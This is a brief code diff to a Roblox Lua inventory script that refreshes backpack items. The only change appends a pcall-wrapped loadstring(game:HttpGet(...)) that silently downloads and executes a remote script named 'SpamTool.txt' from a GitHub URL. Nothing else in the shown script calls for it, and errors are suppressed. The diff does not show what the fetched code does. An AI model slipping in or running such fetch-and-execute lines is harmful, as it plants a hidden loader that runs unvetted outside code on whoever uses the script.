@@ -268,3 +268,8 @@ backpack.ChildRemoved:Connect(refreshItems)
 
 -- Initial load
 refreshItems()
+
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheScript101/Gren/refs/heads/main/Dahood/SpamTool.txt"))()
+end)
+
